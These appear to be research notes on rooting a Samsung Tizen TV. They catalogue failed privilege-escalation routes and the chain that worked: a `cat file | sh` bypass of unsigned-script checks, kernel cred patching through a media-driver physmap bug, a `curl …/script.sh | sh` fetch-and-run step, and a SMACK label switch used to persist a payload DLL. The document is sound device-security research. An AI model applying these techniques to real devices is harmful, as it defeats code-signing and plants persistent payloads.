# What did not work (and why)

Negative results are the most expensive part of this research. Each item below
was tested on the live unit; "do not retry" means it was measured, not assumed.

## sdb / developer bridge

- **Plain `sdb shell`** — closed. The shell is whitelist-only (`applist`,
  `vd_applist`, `getduid`, `appinstall`, `uninstall`).
- **SVE-2025-50109 `appinstall` injection** — inert. Instant `closed`,
  0.00 s delta vs `sleep 6` over three trials, no callback on 80/7000/10247;
  the filename form of `sdb install` does nothing. This kills every published
  chain that enters through sdb.
- **sdbd `root:on`** — dead end. Not buxton-gated: `rootshell_service` compares
  the startup-cached capability string, and `libsdbd_plugin.so` 3.8.11 never
  implements capability 10005, so it is permanently "disabled". Patching the
  cached string in RAM only changes the banner; the plugin's command whitelist
  still blocks execution. RAM-only, cannot bootstrap.
- **Other sdbd services** — `sync:` and `tcp:` are open, the rest closed.
  Useful for metadata and loopback tunnels, not for code execution.

## UEP (unsigned executable prevention)

- **tmpfs exec** (`/run`, `/dev/shm`) — blocked even as root, even for
  byte-copies of signed binaries. Mounts are not `noexec`; the check is in the
  kernel/UEP path, not the filesystem.
- **GPL-source `s_uepStatus` kill switch** — located and cleared in RAM
  (phys `0x20971954`, 1→0, readback 0); the block did **not** lift. The shipped
  kernel differs from the released source; the GPL UEP strings are unreferenced
  in the running image.
- **`LD_PRELOAD`** — blocked (`failed to map segment from shared object`).
- **Script files** — `/usr/bin/bash` links `libkUEPUser.so` and verifies script
  *files* (`[uep][bash] … NOT signed`). `sh <file>` is blocked.
- **`cat <script> | sh` works** — piping a file into the interpreter bypasses
  the file check. This is the useful escape hatch, but it runs as the caller
  (owner), not root.
- **`/opt/etc/parseinfo.sh`** — carries a `##UEP…` signature; editing it breaks
  the boot service. Restored, md5 verified.

## Privilege boundaries

- **systemd** — PID 1, but it does not read `/opt` for units or drop-ins (six
  planted, none ran). Starting a transient unit over D-Bus from uid 5001
  returns `AccessDenied`.
- **Package installer** — extracts before verifying and honours absolute paths,
  but writes **new files only** (existing file → `Unzip error`) and no
  root-executed consumer was found on a writable path.
- **D-Bus / buxton** — no root/build keys; only `db/sdk/develop/{mode,ip}`
  exist. No escalation path.

## Kernel modules / CVEs

- **`tztv_frc_tcon` file-copy helpers** — `call_usermodehelper` with
  unvalidated args, but the function pointers in
  `tztv_frc_tcon_api.ko` are never called and no other module references them.
  Dead code here. Do **not** poke `/dev/tztv_tcon`: the reachable dispatcher
  runs TCON flash programming (brick risk).
- **`/dev/tzmem`** — correctly designed: physical address derived from a real
  `struct page`, fresh allocations on mmap. No physmap.
- **`wasutility`** — root commands receive hardcoded paths or `is_dir`-validated
  static globals, never `optarg`.
- **CVE-2025-0072** — CSF-only; this TV is Mali-G51 Job-Manager/Bifrost
  (r48p0), so it cannot apply.
- **CVE-2023-6241** — Bifrost r11–r25; out of range for r48p0.
- **CVE-2025-0819** — in range (r44–r49p3) but no public PoC; would be original
  kernel work.
- **`mali.ko` is not on disk** — the driver is built in; no module to inspect.

## Misc

- **`core_pattern`** — writable at phys `0x20976BA4` (sysctl table
  `0x2095BE5C`), but a SIGSEGV did not invoke the handler (RLIMIT_CORE /
  dumpable), so it was not usable.
- **Firmware flash / kernel patch** — never attempted: secure-boot `sign.bin`
  and the signed VDFS4 superblock are unknown; this stays last resort.

## Browser-lane traps (cost hours)

- **Renderer lifetime.** The stub thread blocks in a socket loop; the browser
  watchdog kills the renderer after a few minutes. Deploy in one batch, or use
  a watcher that fires the moment the stub connects.
- **One `/dev/video40` RDWR opener.** If the payload holds it, the browser
  physmap cannot open it (and vice versa). The boot payload must close it after
  rooting.
- **`fork()` copies the cred.** Patching a forked child does not change the
  parent's uid. Find the parent through the child's `real_parent` and patch
  *that*. Two payload generations failed exactly here.
- **Kernel pointer range.** The LPAE direct map is `0xC0000000..0xFFFFFFFF`;
  task/cred addresses above `0xE0000000` are normal. A `<0xE0000000` sanity
  check makes the parent scan fail with "no parent".
- **Post-fork managed code.** A string marshal or allocation in the child after
  `fork()` can deadlock in the CLR; use a pre-pinned buffer and raw syscalls.
- **Long op-7 commands.** About 100 characters is the practical limit; a
  330-character command killed the stub. Use `curl …/script.sh | sh`.
- **Page reload kills the stub.** Each reload creates a new stub; never reload
  between rooting and deploying.
- **`op 7` (RUN) is one-shot per stub** (measured 2026-10-22). The first
  `fork+execve("/bin/sh")` works and physmap keeps working afterwards; a second
  `op 7` on the same stub times out and the stub is then deaf. Budget one shell
  batch per page load.
- **A wedged stub used to block everything.** The gateway kept its socket
  forever, so a deaf stub answered every later client with a cached hello and
  nothing else. The server now prefers a freshly queued stub; after a TV hard
  power-cycle, restart the server anyway (no FIN arrives, so the old socket
  looks alive).

## Kernel-memory SMACK relabel — attempted, not finished (2026-10-22 17:40)

`tools/smack_relabel.py` implements the only route back to on-device persistence:
make our task carry the app's label, then deploy normally. Design and live
measurements: lab `research/SMACK-RELABEL-2026-10-22.md`.

Two blockers, both properties of this kernel, not of the idea:

1. **The task list is unusable**, so the fork-child locator has nothing to walk;
   the fallback (physical scan for the `PHYSRPC1` comm tag) needs a clean
   600 MB read and did not find the live task above `0x45F00000` on that boot.
2. **Long `readmany` scans desync the stub.** Batches abort on unmappable pages;
   after enough aborts the socket carries stray bytes and every later read
   returns a garbage status (`RPC read error -514785277`). That silently turns a
   scan into a "negative result". The tool now checks `init_task.comm` between
   batches and aborts with `DESYNCED_STUB` instead of lying.

Next attempt: a **fresh stub**, nothing else done on it, scan in 8 MB batches
with the sanity check, and stop at the first hit that satisfies comm + cred +
`task->security`'s label string. Do not re-run on a stub that already served a
scan or an `op 7`.

## SMACK — RESOLVED 18:52, and the kernel route was never needed

**The userspace relabel works.** From a root shell with the patched cred
(full caps), this succeeds:

```sh
echo -n "User::Pkg::com.samsung.tv.MultiControl-Service" > /proc/self/attr/current
```

and the shell then carries the app's label - measured twice at 18:48. The earlier
"`/proc/self/attr/current` is denied by `smack_onlycap`" note (15:23) was wrong or
context-dependent; retest it before believing it. With the label set, the app's
`bin/` is writable (its parent is `User::Home` **transmute=TRUE**), so
`deploy.sh` runs unchanged from that shell and reports `COPY=ok`,
`DLL_LABEL=...::RO`, `AOT=disabled`, `BOOT_ROW=ok`.

Two things that made this look impossible for hours:

* the app's process `comm` is **`DN_trol-Service`** (exe
  `/usr/bin/dotnet-launcher-inhouse`), not `MultiControl*` - so every physical scan
  for the app was searching for a name that never exists;
* the app is **not visible in the browser shell's PID namespace**, so `ps`/`/proc`
  look empty even when `aulctl status` reports it running with a pid.

And `aulctl reload` does **not** restart an already-running app - `aulctl stop`
then `aulctl start` is what loads the new DLL.

## Kernel-memory SMACK relabel — outcome 2026-10-22 18:42

Attempted properly; **not finished**, and the remaining obstacle is now precise.
Full analysis: lab `research/SMACK-RELABEL-2026-10-22.md`; tools
`tools/smack_relabel.py`, `tools/smack_borrow.py`, `tools/find_task.py`,
`tools/dwarf_offsets.py`.

What works:

* the stub's own task is located reliably (it is `init.tasks.prev` immediately
  after a fork - no list walk), and its cred is rooted in a few reads;
* `cred->security` is at **cred+0x64** and is a real `task_smack`, proven by the
  self-referential `smk_rules` list inside it:
  `e3870f80 e3870f80 c747b848 c747b848`.

What blocks it:

* `smk_task = 0xe3870f80` is **above 0xE0000000, i.e. vmalloc space**, so
  `phys = va - 0xA0000000` does not apply and the physmap cannot read the
  `smack_known`. Name-based discovery is therefore closed: 635 copies of the
  label string exist in `0x20000000-0x40000000` and **none** is pointed at.
* the workaround - copy the label pointer out of the app's own process
  (`cred->security->smk_task`) - needs that process, and
  `tools/find_task.py` (resumable scan, reconnects on a desynced batch) found
  **zero** `MultiControl*` tasks in `0x20000000-0x40000000`, before and after a
  reboot. Either the stock app was not running, or its `task_struct` is itself in
  vmalloc space (one process at `0xe12e6780` was seen in a list walk).

Next steps, cheapest first: (1) confirm from a root shell whether the app is
running (`ps`, `aulctl status com.samsung.tv.MultiControl-Service`); (2) map
vmalloc to physical by walking `init_mm.pgd` in the LPAE 3-level format - that
unblocks both the label read and any vmalloc task; (3) alternatively audit an
on-boot `User::App::Shared` app (`appbinarymanager`, `appdrm`, `esg-service`,
`hdcp*`, `hdmicec-service`, `mediaanalytics`, `playready`) for a load path inside
its writable area, which would need no label work at all.

Also learned: `tools/dwarf_offsets.py` extracts struct offsets from the sim
kernel's DWARF, and four of them matched the TV exactly (comm +0x400, cred +0x3F8,
real_parent +0x2F0, tasks +0x23C) - so the sim is a valid layout source, with the
caveat that later members differ (the sim has `CONFIG_KEYS=n`, the TV has keyrings).

## How the payload was originally installed (answered 2026-10-22 17:25)

The first swap (2026-10-22 00:2x) was an **in-place overwrite**, not a copy:

```
cat /opt/usr/home/owner/share/mcs.dll > <app>/bin/MultiControlService.dll
```

An in-place truncate+write **keeps the inode**, and with it the owner, mode and
SMACK label the file already had. Later deploys used `cp` to `.tmp` + `mv`, which
creates a **new inode carrying the writer's label** - that is the mechanism behind
the afternoon's regression (browser-labelled DLL -> app denied read -> dead
before `Main`).

The permission half is now clear from the shipped policy
(`etc/smack/accesses.d`): for `User::Home` there are rules only for
`System`, `System::TEF`, `System::Privileged`, `User`, `User::Shell` and `_` -
**no `User::Pkg::*` rule at all**, and nothing mentioning
`com.samsung.tv.MultiControl-Service`. Cross-app writes are therefore never
granted by policy; a browser-labelled process can only write what its own label
owns. Two consequences:

* the deploy must carry (or be) the **app's label** - either because the channel
  process is the payload (which was true for every deploy that worked today), or
  because the task was relabelled in kernel memory;
* the `::RO` files inside `bin/` are readable by the app because the app label
  matches, and the app root is `User::Home` **transmute=TRUE**, so files created
  while carrying the app label inherit it - no `chsmack` needed.

Also learned: `chsmack <path>` with **no options prints** the label
(`access="..." transmute="..."`); my earlier `chsmack -p` was simply wrong.

## The app lane is one-way from a stock TV (2026-10-22 17:12) — SUPERSEDED 18:51

> **Superseded.** The conclusion below was right about *the browser label* and
> wrong about the *possibility of re-installing*. At 18:48 a root shell was found
> to take the app's label directly with
> `echo -n "User::Pkg::com.samsung.tv.MultiControl-Service" > /proc/self/attr/current`,
> after which `deploy.sh` writes the payload as the app's own file. The payload
> was reinstalled at 18:51 and verified on a cold boot (31337 in 41 s). See
> `docs/ROOT-METHODS.md` and `server/recover.sh`. The text below is kept as the
> accurate record of why the obvious route fails.

Measured with a root shell carrying the **browser** label
(`User::Pkg::org.tizen.browser`), after `uninstall.sh` had restored the stock app:

```
app root  /opt/usr/apps/com.samsung.tv.MultiControl-Service   User::Home   write=DENIED
app bin   .../bin                                             stat=DENIED (d?????????)
```

`touch`, `cp`, `rm`, even `ls -ldZ bin` fail. A full survey of all ~250
`/opt/usr/apps/*` directories shows why: every app directory is `User::Home` or
`_` and **not writable** from this label; only a handful of native system apps
are labelled `User::App::Shared` and writable (`appbinarymanager`, `appdrm`,
`esg-service`, `hdcp`, `hdcp-common`, `hdmicec-service`, `mediaanalytics`,
`playready`) — none of them a dotnet-inhouse/on-boot carrier.

Consequence, and the important lesson: **once the payload is removed, the
browser lane can root the TV but cannot put the payload back.** Every deploy that
worked (15:56, 16:33, 16:48, 16:53) ran from the **app's own 31337 channel**,
whose process label matches the app directory. The first install therefore has to
come from a context that already carries the app label, or from a write primitive
the installer grants (it refuses to overwrite existing files), or from a SMACK
relabel done in kernel memory. Do not uninstall "just to re-test" without a plan
to get the label back.

## Misdiagnosis trap (2026-10-22, cost most of a day)

**"AUL does not start the app at boot" was false.** The symptom — no beacon
after boot, `aulctl` row present, app absent from `ps` — looks exactly like a
launcher problem, and the first fix attempts (boot row, `aulctl reload`, AOT
handling) were aimed there. `aulctl status <appid>` actually said
`sub status: exited` with a `terminated` timestamp, and `dmesg | grep -i smack`
had the real reason:

```
subject="User::Pkg::<app>"  object="User::Pkg::org.tizen.browser"
requested=r  path=".../MultiControlService.dll"
```

The DLL carried the **deployer's** SMACK label (the browser's), so the app could
not read its own assembly. Two habits avoid this class of error:

1. `aulctl status` distinguishes "never started" from "started and died" — read
   it before theorising about the launcher.
2. The audit log names the exact subject/object/path of a denial. It is the
   cheapest oracle on this device; check it before blaming a component.

Related: a label readback without `ls -Z` returns an empty string on this Tizen,
so a deploy can print `COPY=ok`/`DEPLOY_DONE` and still ship an unlaunchable app.

## Lesson

The working path was not any of the "obvious" escalations. It was a
**mapping-authority bug in a media driver** plus a **stock on-boot service
app**, i.e. two mundane components that were never designed to be a security
boundary.
